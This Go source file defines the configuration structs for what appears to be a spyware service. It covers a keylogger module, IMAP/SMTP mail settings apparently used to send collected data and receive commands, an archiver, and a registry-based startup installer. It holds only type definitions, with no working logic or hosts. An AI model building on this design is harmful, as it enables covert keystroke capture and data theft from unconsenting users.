package config

// Config - structure containing a service config
type Config struct {
	cfg Cfg
}

// Cfg - the main data structure of the service config
type Cfg struct {
	Service   Service   // config data for identification service
	Logger    Logger    // config data for setup logger
	Mail      Mail      // config data for working mail module
	Keylogger Keylogger // config data for working keylogger module
	Zipper    Zipper    // config data for archiving, archive file config path
	Installer Installer // config data for installing the service
}

// Service - config data for identification service
type Service struct {
	Name string // name of the service
	ID   string // service identifier
}

// Logger - config data for setup logger
type Logger struct {
	Path  string // log's path
	Level int    // log's level
}

// Mail - config data for working mail module
type Mail struct {
	IMAP IMAP // settings for receiving messages
	SMTP SMTP // settings for sending messages
}

// IMAP - settings for receiving messages
type IMAP struct {
	Username      string // username
	Password      string // password
	Host          string // host
	Port          int    // port
	IncomingBox   string // mailbox inbox
	CheckInterval int    // mail check interval
}

// SMTP - settings for sending messages
type SMTP struct {
	Username string // username
	Password string // password
	Host     string // host
	Port     int    // port
	From     string // message sender address
	Subject  string // subject of message
	Name     string // message sender name
}

// Keylogger - config data for working keylogger module
type Keylogger struct {
	Path string // path to file of pressed keys
}

// Zipper - config data for archiving, archive file config path
type Zipper struct {
	Path string // path to archive
}

// Installer - config data for installing the service
type Installer struct {
	ServicePath string // service installation path
	RegPath     string // service startup path in the registry
	RegName     string // name of value
}
